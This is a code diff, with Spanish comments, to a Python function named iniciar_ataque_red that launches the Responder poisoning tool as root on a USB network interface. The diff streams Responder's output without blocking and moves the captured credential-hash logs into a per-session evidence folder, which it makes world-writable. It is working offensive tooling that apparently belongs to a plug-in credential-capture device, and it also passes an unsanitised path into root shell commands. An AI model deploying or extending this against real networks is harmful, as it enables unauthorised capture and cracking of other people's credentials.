@@ -2,6 +2,8 @@ import os
 import subprocess
 import time
 import re
+import select
+
 
 def iniciar_ataque_red(interface="usb0", callback_consola=None, session_dir=None): # <-- Se añade session_dir
     
@@ -11,6 +13,7 @@ def iniciar_ataque_red(interface="usb0", callback_consola=None, session_dir=None
         for simbolo in reemplazos:
             texto_limpio = texto_limpio.replace(simbolo, '')
             
+
         if callback_consola:
             # self.escribir_consola de raspi.py agrega los saltos de línea automáticamente
             callback_consola(f"{texto_limpio}") 
@@ -78,6 +81,8 @@ def iniciar_ataque_red(interface="usb0", callback_consola=None, session_dir=None
         else:
             comando = ["sudo", "responder", "-I", interface, "-wvF"]
 
+
+
         proc_responder = subprocess.Popen(
             comando,
             stdout=subprocess.PIPE,
@@ -86,12 +91,22 @@ def iniciar_ataque_red(interface="usb0", callback_consola=None, session_dir=None
             bufsize=1
         )
 
+
         while True:
-            linea = proc_responder.stdout.readline()
-            if not linea and proc_responder.poll() is not None:
-                break
-            if linea:
-                log(linea.strip())
+            # Usamos 'select' con timeout de 1 segundo para evitar que la lectura se congele
+            reads, _, _ = select.select([proc_responder.stdout], [], [], 1.0)
+            
+            if proc_responder.stdout in reads:
+                linea = proc_responder.stdout.readline()
+                if not linea:  # Si ya no hay texto en el buffer
+                    if proc_responder.poll() is not None:
+                        break
+                else:
+                    log(linea.strip())
+            else:
+                # Timeout de 1 seg: Si no escupe nada nuevo, verificamos si presionaste "Detener"
+                if proc_responder.poll() is not None:
+                    break
 
     except Exception as e:
         log(f"\n[!] Error crítico: {e}")
@@ -122,9 +137,9 @@ def iniciar_ataque_red(interface="usb0", callback_consola=None, session_dir=None
             log(f"[*] Organizando evidencia en: {os.path.basename(session_dir)}")
             os.makedirs(session_dir, exist_ok=True)
             
-            # Usamos MV (mover) para evitar que sesiones futuras muestren hashes de ataques viejos
-            os.system(f"sudo mv /usr/share/responder/logs/* {session_dir}/ 2>/dev/null")
-            os.system(f"sudo mv /opt/Responder/logs/* {session_dir}/ 2>/dev/null")
+            # Usar 'sh -c' asegura que Root interprete el comodín (*) al mover los archivos
+            os.system(f"sudo sh -c 'mv /usr/share/responder/logs/* {session_dir}/' 2>/dev/null")
+            os.system(f"sudo sh -c 'mv /opt/Responder/logs/* {session_dir}/' 2>/dev/null")
             
             os.system(f"sudo chmod -R 777 {session_dir} 2>/dev/null")
             
